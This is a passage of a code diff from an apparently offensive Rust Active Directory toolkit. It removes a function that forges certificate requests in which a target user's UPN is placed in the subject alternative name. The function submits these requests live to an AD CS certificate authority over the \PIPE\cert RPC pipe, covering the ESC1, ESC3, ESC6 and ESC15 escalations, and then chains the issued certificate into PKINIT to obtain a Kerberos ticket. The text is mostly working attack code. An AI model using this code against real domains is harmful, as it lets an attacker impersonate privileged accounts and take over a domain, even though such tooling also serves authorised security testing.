-        _ => ms_icpr::build_csr_with_upn_san(&a.subject, &a.target_upn, &key_pem)
-            .context("build_csr_with_upn_san")?,
-    };
-    std::fs::write(&a.csr_out, &csr)?;
-    eprintln!(
-        "[+] CSR built (variant={:?}, subject CN={}, SAN otherName+UPN={}) → {} ({} bytes)",
-        a.esc,
-        a.subject,
-        a.target_upn,
-        a.csr_out,
-        csr.len()
-    );
-
-    // Synthesize a minimal `CertTemplate` — with no LDAP fetch here, this stand-in
-    // exists purely to make `IcprClient::marshal_call` preflight pass so the stub
-    // bytes can be materialised. Live submissions run through `attack esc1` today.
-    let template = CertTemplate {
-        name: a.template.clone(),
-        oid: Oid::new("1.3.6.1.4.1.311.21.8.1.42"),
-        schema_version: a.schema_version.unwrap_or(2),
-        enrollment_flag: EnrollmentFlag::empty(),
-        name_flag: NameFlag::ENROLLEE_SUPPLIES_SUBJECT,
-        private_key_flag: PrivateKeyFlag::empty(),
-        ekus: vec![Oid::new("1.3.6.1.5.5.7.3.2")],
-        min_ra_signatures: 0,
-        raw_security_descriptor: None,
-    };
-    // Always emit the offline stub so consumers can diff / replay
-    let stub_client = ms_icpr::IcprClient::stub(a.ca.clone());
-    let stub = stub_client
-        .marshal_call(&template, &csr)
-        .context("ms_icpr::IcprClient::marshal_call")?;
-    std::fs::write(&a.out, &stub)?;
-    eprintln!(
-        "[+] marshaled CertServerRequest stub → {} ({} bytes, opnum {})",
-        a.out,
-        stub.len(),
-        ms_icpr::CERT_SERVER_REQUEST_OPNUM
-    );
-
-    // Live submit path — enabled via ms-icpr's `network` feature (default on after
-    // dcerpc 0.2.3 resolver-cycle fix). Requires --host + --domain + --user.
-    if let Some(host) = a.host.as_deref() {
-        let domain = a
-            .domain
-            .as_deref()
-            .ok_or_else(|| anyhow::anyhow!("--domain required when --host is set"))?;
-        let user = a
-            .user
-            .as_deref()
-            .ok_or_else(|| anyhow::anyhow!("--user required when --host is set"))?;
-        eprintln!(
-            "[*] submitting to {} \\\\PIPE\\\\cert (CA={}) as {}\\{}",
-            host, a.ca, domain, user
-        );
-        let mut client =
-            ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
-                .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
-        let submit_result = match a.esc {
-            EscVariant::Esc1 | EscVariant::Esc15 => client.submit_request(&template, &csr),
-            EscVariant::Esc6 => {
-                let san = a.san_upn.as_deref().unwrap_or(a.target_upn.as_str());
-                client.submit_request_esc6(&template, &csr, san)
-            }
-            EscVariant::Esc3 => {
-                let agent_cert_path = a
-                    .agent_cert
-                    .as_deref()
-                    .ok_or_else(|| anyhow::anyhow!("--agent-cert required with --esc esc3"))?;
-                let agent_key_path = a
-                    .agent_key
-                    .as_deref()
-                    .ok_or_else(|| anyhow::anyhow!("--agent-key required with --esc esc3"))?;
-                let agent_cert = std::fs::read(agent_cert_path)
-                    .with_context(|| format!("read --agent-cert {agent_cert_path}"))?;
-                let agent_key = std::fs::read(agent_key_path)
-                    .with_context(|| format!("read --agent-key {agent_key_path}"))?;
-                let signing_time = std::time::SystemTime::now()
-                    .duration_since(std::time::UNIX_EPOCH)
-                    .map(|d| d.as_secs() as i64)
-                    .unwrap_or(0);
-                let cms_blob =
-                    ms_icpr::build_esc3_request(&csr, &agent_cert, &agent_key, signing_time)
-                        .context("ms_icpr::build_esc3_request (CMC EOBO)")?;
-                eprintln!(
-                    "[+] built CMS-signed CMC blob ({} bytes) — submitting as enrollment-agent-on-behalf-of {}",
-                    cms_blob.len(),
-                    a.target_upn
-                );
-                client.submit_request_esc3(&template, &cms_blob)
-            }
-        };
-        match submit_result {
-            Ok(issued) => {
-                let cert_path = format!("{}.issued.pem", a.csr_out);
-                std::fs::write(&cert_path, &issued.pem)?;
-                eprintln!(
-                    "[+] cert ISSUED (request_id={}) → {} ({} bytes)",
-                    issued.request_id,
-                    cert_path,
-                    issued.pem.len()
-                );
-                eprintln!(
-                    "[+] chain into `attack pkinit --cert {} --key {}.key.pem --upn {}` to obtain a TGT",
-                    cert_path, a.csr_out, a.target_upn
-                );
-            }
-            Err(e) => {
-                eprintln!("[-] live submit failed: {e}");
-                eprintln!(
-                    "[i] the offline stub is still available at {} for diagnostic / replay",
-                    a.out
-                );
-                return Err(e.into());
-            }
-        }
-    } else {
-        eprintln!(
-            "[i] offline mode — no --host provided. To submit live, add: \
-             --host <CA-fqdn> --domain <NETBIOS> --user <user> --password <pw>"
-        );
-    }
-    Ok(())
-}
+// EscVariant + IcprEsc1Args + fn icpr_esc1 moved to attacks::icpr_esc1 in arch-0.
 
 // fn unconstrained moved to `attacks::unconstrained` in arch-0.
 async fn roast(a: ScanArgs) -> Result<()> {
